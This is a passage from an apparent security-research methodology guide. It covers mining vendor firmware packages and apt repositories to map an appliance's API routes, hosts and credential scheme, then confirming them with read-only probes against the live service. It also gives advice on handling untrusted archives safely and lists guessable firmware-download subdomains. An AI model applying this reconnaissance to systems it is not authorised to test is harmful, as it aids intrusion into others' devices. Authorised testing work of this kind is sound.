grep -rl 'api/v2/<the-route-you-cannot-auth-to>' x/   # -> the client module
```

A `config/default.json` naming `registryBaseUrls.{prd,stg,dev}` as precisely the three hosts your
lane probed is a **live-fingerprint control**: it proves the offline read corresponds to the live
service, not to an unrelated build.

### Why this beats the container route when it is available

`crane export` on a published image (see § "Offline container source review" above) is the right tool
for self-hosted web products. But appliance vendors often publish no image at all while publishing
every firmware build — and a `.deb` from the vendor's own CDN is a stronger provenance story for a
report than a third-party image mirror.

### Honest limits — say these out loud in the finding

- **Vendor source proves the code path, not production.** Fingerprint the live version and re-verify
  the behaviour with a safe read-only probe before writing anything up. In the vendor case the
  offline read produced two header names; those were then confirmed live by a `400` -> `401`
  transition before being recorded as fact.
- Reading device-side code recovers the *credential scheme*, not the *credential*. Expect to finish
  with "the blocker is now exactly one cheap acquisition", not "exploited". That is still a large win:
  it converts a vague hardware blocker into a named shopping list.
- **The archive is untrusted data.** Own empty directory per archive, analysis scripts in a different
  directory, paths passed as arguments, `python3 -I`, and never run an interpreter, build tool,
  installer or extracted binary from inside the tree — a planted `json.py` executes on `import json`.
  Read binaries with a strings pass; do not execute them.

### Generalise before you move on

Ask, for every appliance/IoT target: *does this vendor publish a firmware or package index?* Try
`fw-update.*`, `fw-download.*`, `dl.*`, `static.*`, `download.*`, `packages.*`, `apt.*`, an
`/api/firmware*` route, and the vendor's own apt/yum repo paths. Confirm with a known product name
before concluding the index does not exist — an empty result for a guessed product name is not an
absent index.
